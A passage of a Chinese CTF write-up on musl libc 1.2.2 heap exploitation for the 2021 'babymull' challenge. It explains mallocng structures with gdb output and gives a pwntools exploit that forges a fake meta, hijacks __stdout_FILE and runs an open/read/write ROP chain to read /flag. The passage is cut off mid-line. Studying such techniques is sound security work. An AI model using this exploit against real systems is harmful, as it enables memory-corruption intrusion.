class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0x41</span>)+p64(<span class="number">0xb40</span>)+p64(mal+<span class="number">880</span>)+p64(libc.sym[<span class="string">&#x27;__stdin_FILE&#x27;</span>]+<span class="number">0x40</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment"># insert bin</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;g&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#5 write stdin!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="Version-1-2-2"><a href="#Version-1-2-2" class="headerlink" title="Version 1.2.2"></a>Version 1.2.2</h1><h2 id="祥云杯-2021-babymull"><a href="#祥云杯-2021-babymull" class="headerlink" title="祥云杯_2021_babymull"></a><strong>祥云杯_2021_babymull</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./libc.so</span> </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://pzhxbz.cn/?p=172">新版musl libc 浅析</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/easy_level1/article/details/118606424">[阅读型]新版musl libc(1.2.2)堆管理之源码剖析！</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241101#h2-5">借助DefCon Quals 2021的mooosl学习musl mallocng（源码审计篇）</a></p>
<p>本题exp参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UwrZVlQ_WJ5rO4InOErt1g">第二届“祥云杯”网络安全大赛官方Writeup-Pwn篇</a> </p>
<h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a><strong>静态分析</strong></h3><p>禁用了execve</p>
<p>只能在add写chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">manage_chunk</span>&#123;</span> # <span class="number">0x20</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">	<span class="keyword">void</span> *chunk_ptr; # chunk_Size &lt;= <span class="number">0x1000</span></span><br><span class="line">	<span class="keyword">size_t</span> size;	</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>chunk_ptr指针free后没置0</p>
<p>有一次show机会</p>
<p>一次后门：将任意一地址的单字节置零，然后泄露任意一地址的 8 字节。</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912182016284.png" alt="image-20210912182016284"></p>
<h3 id="gdb查看数据结构"><a href="#gdb查看数据结构" class="headerlink" title="gdb查看数据结构"></a><strong>gdb查看数据结构</strong></h3><p>对着下图从头开始一个个分析结构</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/t015d8a64ff8626cf0d.png" alt="img"></p>
<h4 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context"></a><strong>__malloc_context</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __malloc_context</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  secret = <span class="number">13395722478044406582</span>, </span><br><span class="line">  init_done = <span class="number">1</span>, </span><br><span class="line">  mmap_counter = <span class="number">0</span>, </span><br><span class="line">  free_meta_head = <span class="number">0</span>x0, </span><br><span class="line">  avail_meta = <span class="number">0</span>x5555560cc1f8,  <span class="comment">#meta_area中管理的空闲的meta首地址，用avail_meta_count表示数量</span></span><br><span class="line">  avail_meta_count = <span class="number">89</span>, </span><br><span class="line">  avail_meta_area_count = <span class="number">0</span>, </span><br><span class="line">  meta_alloc_shift = <span class="number">0</span>, </span><br><span class="line">  meta_area_head = <span class="number">0</span>x5555560cc000, </span><br><span class="line">  meta_area_tail = <span class="number">0</span>x5555560cc000, </span><br><span class="line">  avail_meta_areas = <span class="number">0</span>x5555560cd000 &lt;error: Cannot access memory at address <span class="number">0</span>x5555560cd000&gt;, </span><br><span class="line">  active = &#123;<span class="number">0</span>x0 &lt;repeats <span class="number">11</span> times&gt;, <span class="number">0</span>x5555560cc090, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc068, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc040, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc018, <span class="number">0</span>x0 &lt;repeats <span class="number">24</span> times&gt;&#125;, </span><br><span class="line">  <span class="comment"># 堆管理器依据申请的size，将chunk分成48类chunk。缓存可继续分配的meta，数组下标与大小有关。</span></span><br><span class="line">  usage_by_class = &#123;<span class="number">0</span> &lt;repeats <span class="number">48</span> times&gt;&#125;, <span class="comment"># 对应大小的缓存的所有meta的group所管理的chunk个数。</span></span><br><span class="line">  unmap_seq = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;, </span><br><span class="line">  bounces = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;, </span><br><span class="line">  seq = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">  brk = <span class="number">93825004261376</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp;__malloc_context</span><br><span class="line"><span class="variable">$2</span> = (struct malloc_context *) <span class="number">0</span>x7f952e19cb60 &lt;__malloc_context&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | <span class="keyword">DATA</span> | RWX | RODATA</span><br><span class="line">......</span><br><span class="line">    <span class="number">0</span>x7f952e19c000     <span class="number">0</span>x7f952e19d000 rw<span class="literal">-p</span>     <span class="number">1000</span> <span class="number">98000</span>  /home/wendy/Desktop/xyb/babymull/libc.so</span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>__malloc_context</code>是musl libc的全局管理结构指针,相当于main_arena，存放在libc.so的bss段</p>
<p><code>active = &#123;0x0 &lt;repeats 11 times&gt;, 0x5555560cc090,0...</code>：堆管理器依据申请的size，将chunk分成48类chunk，由sizeclass指定。每类chunk由一个meta结构管理，meta管理的chunk个数有限，由<code>small_cnt_tab</code>指定。当申请个数超出一个meta所能管理的最大数量，堆管理器会再申请同类型meta管理更多的chunk，并且以双向链表结构管理这些相同类型的meta。<br><code>usage_by_class = &#123;0 &lt;repeats 48 times&gt;&#125;</code>：表示当前各meta管理着的chunk个数。</p>
<h4 id="申请-chunk后的malloc-context变化"><a href="#申请-chunk后的malloc-context变化" class="headerlink" title="申请 chunk后的malloc_context变化"></a><strong>申请 chunk后的malloc_context变化</strong></h4><p>这里直接用这题做测试，add 0x20两次，相当于申请了4个0x30的chunk</p>
<p>用户申请空间之后，才有了meta页来对chunk进行管理</p>
<p>同时malloc_context的active数组对应元素会指向meta地址</p>
<p>usage_by_class数组会显示该meta的每group可管理chunk的最多数量</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/%E6%97%A0%E6%A0%87%E9%A2%98.png" alt="无标题"></p>
<h4 id="meta结构体"><a href="#meta结构体" class="headerlink" title="meta结构体"></a><strong>meta结构体</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">// meta是一个双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>申请4个chunk之后gdb查看meta结构</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>



<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912153822227.png" alt="image-20210912153822227"></p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912154050548.png" alt="image-20210912154050548"></p>
<blockquote>
<p><code>0x7fb8fbfa9ce0</code>是<code>user data</code>域；<br><code>avail_mask = 1008 = 0b11 1111 0000</code>表示第0、1、2、3个chunk不可用（已经被使用）；<br><code>freed_mask = 0</code>表示没有chunk被释放；<br><code>last_idx = 9</code>表示最后一个chunk的下标是9，总数是10个<br><code>sizeclass = 2</code>表示由<code>2</code>这个group进行管理。</p>
</blockquote>
<p>当我们把2这个group里10个chunk都使用掉，之后申请就会开辟第二个meta页进行管理，两个meta之间由一个双向链表进行维护；</p>
<h4 id="group里的chunk结构"><a href="#group里的chunk结构" class="headerlink" title="group里的chunk结构"></a><strong>group里的chunk结构</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struck chunk&#123;</span><br><span class="line">    uint8 zero;</span><br><span class="line">    uint8 idx;  <span class="comment">// 低7位是idx， 高5位是reserved</span></span><br><span class="line">    uint16 offset;</span><br><span class="line">    <span class="keyword">char</span>[] usermem; <span class="comment">// &lt;--用户拿到的内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由上图meta结构中的mem指针查看<code>user data</code>域</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912160425927.png" alt="image-20210912160425927"></p>
<p>需要注意，分配给用户的 最小chunk size 是0x8</p>
<p>和glibc类似，可以进行<strong>复用</strong>，可以接收输入<code>8+4</code>个byte，<strong>占用下一个chunk header的前4个byte</strong></p>
<h4 id="释放-chunk之后meta结构变化"><a href="#释放-chunk之后meta结构变化" class="headerlink" title="释放 chunk之后meta结构变化"></a><strong>释放 chunk之后meta结构变化</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>, b<span class="string">&quot;B&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>, b<span class="string">&quot;C&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct meta*)<span class="number">0</span>x55555688b1f8</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  prev = <span class="number">0</span>x55555688b1f8, </span><br><span class="line">  next = <span class="number">0</span>x55555688b1f8, </span><br><span class="line">  mem = <span class="number">0</span>x7f9d4c0fbce0, </span><br><span class="line">  avail_mask = <span class="number">1008</span>, </span><br><span class="line">  freed_mask = <span class="number">3</span>, </span><br><span class="line">  last_idx = <span class="number">9</span>, </span><br><span class="line">  freeable = <span class="number">1</span>, </span><br><span class="line">  sizeclass = <span class="number">2</span>, </span><br><span class="line">  maplen = <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>freed_mask = 3 = 0b11</code>表示前两个chunk被释放；<br><code>avail_mask = 1008 = 0b11 1111 0000</code>可以发现，avail_mask没变，此时前两个chunk仍然为不可分配的状态；</p>
<p>chunk header</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912163514516.png" alt="image-20210912163514516"></p>
<p>上面了解得差不多了，应该就可以看懂exp了</p>
<p>开始复现</p>
<h3 id="how-to-leak-1"><a href="#how-to-leak-1" class="headerlink" title="how to leak"></a><strong>how to leak</strong></h3><p>manage chunk里面就有slot指针（其实就是chunk，但是好像在musl里面叫slot），但是前面的name有截断符，泄露不了</p>
<p>当一个group的所有chunk都被使用过了 ，才会使用被释放的chunk，</p>
<p>那么我们先申请完10个chunk，并填满数据，再释放上图前两个框的chunk，</p>
<p>再申请两个size不等于0x20的content_chunk，则第二个content_chunk的manage_chunk就是上图第二个框的chunk，</p>
<p>name的截断符就没有了，这样show功能可以直接泄露后面的指针域</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912170553923.png" alt="image-20210912170553923"></p>
<h3 id="how-to-hijack-1"><a href="#how-to-hijack-1" class="headerlink" title="how to hijack"></a><strong>how to hijack</strong></h3><p>dele content_chunk5时</p>
<p>会根据content_chunk5的head中的offset定位到存放meta地址的地址</p>
<p>offset被我们用后门函数改为了0x1000</p>
<p>所以就定位到了chunk0内已经写好的fake meta地址</p>
<p>这样fake meta就被链到了active里</p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912223251244.png" alt="image-20210912223251244"></p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912223348499.png" alt="image-20210912223348499"></p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912223734296.png" alt="image-20210912223734296"></p>
<p>之后再edit chunk0 </p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210913101355722.png" alt="image-20210913101355722"></p>
<p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210913103019896.png" alt="image-20210913103019896"></p>
<p>这篇新空间刚好可以用来写orw_rop</p>
<p>之后申请0x800的chunk就刚好能申请到stdout_FILE</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;119.3.81.43&#x27;</span>, <span class="number">49153</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;./libc.so&quot;</span>,<span class="string">&quot;./babymull&quot;</span>])</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">Size,content=<span class="string">&#x27;A&#x27;</span>, name=<span class="string">b&quot;A&quot;</span>*<span class="number">0xf</span></span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&#x27;Name: &#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(Size))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">set_zero,leak_addr</span>):</span></span><br><span class="line">    menu(<span class="number">0x73317331</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(set_zero))</span><br><span class="line">    sl(<span class="built_in">str</span>(leak_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0x20</span>) <span class="comment"># fill group2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>)                       <span class="comment"># 0 use manage_chunk0</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x238</span> + p32(<span class="number">0x5</span>)) <span class="comment"># 5 use content_chunk0        why p32(0x5)????</span></span><br><span class="line"><span class="comment">#                                   # fake reserved_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Leak libc address</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc.address = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) + <span class="number">0x2aa0</span> +<span class="number">0x6000</span></span><br><span class="line">leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line">mmap_base = libc.address - <span class="number">0xa000</span> </span><br><span class="line">leak(<span class="string">&#x27;mmap_base&#x27;</span>,mmap_base)</span><br><span class="line">leak(<span class="string">&#x27;mmap_base + 0x1560 -8 + 6&#x27;</span>,mmap_base + <span class="number">0x1560</span> -<span class="number">8</span> + <span class="number">6</span>)</span><br><span class="line">leak(<span class="string">&#x27;malloc_context&#x27;</span>,libc.symbols[<span class="string">&#x27;__malloc_context&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify head of content_chunk_5 // offset 0x1550-&gt;0x1000</span></span><br><span class="line"><span class="comment"># leak __malloc_context-&gt;secrect</span></span><br><span class="line">gift(mmap_base + <span class="number">0x1560</span> -<span class="number">8</span> + <span class="number">6</span> ,libc.symbols[<span class="string">&#x27;__malloc_context&#x27;</span>])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">secret = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;secret&#x27;</span>,secret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Construct fake_meta and fake_meta_arena</span></span><br><span class="line">fake_meta     = mmap_base+<span class="number">0x1000</span>+<span class="number">8</span></span><br><span class="line">fake_meta_ptr = mmap_base+<span class="number">0x550</span></span><br><span class="line"><span class="comment"># fake_meta_ptr</span></span><br><span class="line">pp  = flat(&#123;<span class="number">0x550</span>-<span class="number">0x30</span>: fake_meta&#125;, filler=<span class="string">&#x27;\x00&#x27;</span>, length=<span class="number">0x1000</span>-<span class="number">0x30</span>) </span><br><span class="line"><span class="comment"># fake meta_arena</span></span><br><span class="line">pp += p64(secret) <span class="comment"># area-&gt;check</span></span><br><span class="line"><span class="comment"># fake meta</span></span><br><span class="line">pp += flat([<span class="number">0</span>, <span class="number">0</span>,            <span class="comment"># meta-&gt;prev, meta-&gt;next</span></span><br><span class="line">            fake_meta_ptr,   <span class="comment"># meta-&gt;mem</span></span><br><span class="line">            <span class="number">0</span>,               <span class="comment"># meta-&gt;avail_mask, meta-&gt;freed_mask</span></span><br><span class="line">            (<span class="number">24</span>&lt;&lt;<span class="number">6</span>)+<span class="number">1</span>        <span class="comment"># meta-&gt;sizeclass, meta-&gt;last_idx </span></span><br><span class="line">        ])</span><br><span class="line">leak(<span class="string">&#x27;fake_meta&#x27;</span>,fake_meta)</span><br><span class="line">leak(<span class="string">&#x27;fake_meta_ptr&#x27;</span>,fake_meta_ptr)</span><br><span class="line"><span class="comment">#edit chunk0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,pp) <span class="comment"># write fake meta to chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># insert fake meta</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit chunk0(fake meta-&gt;mem to __stdout_FILE)  // uaf bin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">0x40</span>+<span class="number">8</span>) + flat([<span class="number">0</span>, <span class="number">0</span>, libc.symbols[<span class="string">&quot;__stdout_FILE&quot;</span>]-<span class="number">0x940</span>, <span class="number">2</span>, (<span class="number">24</span>&lt;&lt;<span class="number">6</span>)+<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Build orw ROP</span></span><br><span class="line"></span><br><span class="line">buf       = mmap_base + <span class="number">0x2aa0</span></span><br><span class="line">leak(<span class="string">&#x27;buf&#x27;</span>,buf)</span><br><span class="line">rop_chain = mmap_base + <span class="number">0x2ba0</span></span><br><span class="line">leak(<span class="string">&#x27;rop_chain&#x27;</span>,rop_chain)</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x15536</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x1b3a9</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x4727c</span></span><br><span class="line">xchg_eax_edi = libc.address + <span class="number">0x26e75</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>  = libc.symbols[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read  = libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write = libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">rop = flat([</span><br><span class="line">    pop_rdi, buf,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">open</span>,           <span class="comment"># open(&quot;/flag&quot;, 0)</span></span><br><span class="line">    xchg_eax_edi,   <span class="comment">#xchg   edi,eax	; ret</span></span><br><span class="line">    pop_rsi, buf,</span><br><span class="line">    pop_rdx, <span class="number">0x100</span>,</span><br><span class="line">    read,           <span class="comment"># read(fd, buf, 0x100)</span></span><br><span class="line">    pop_rdi, <span class="number">1</span>,</span><br><span class="line">    pop_rsi, buf,</span><br><span class="line">    pop_rdx, <span class="number">0x100</span>,</span><br><span class="line">    write,          <span class="comment"># write(1, buf, 0x100)</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&quot;/flag&quot;</span>.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>) + rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment">### Build fake __stdout_FILE</span></span><br><span class="line"><span class="comment"># 0x15238: ret; </span></span><br><span class="line">ret       = libc.address + <span 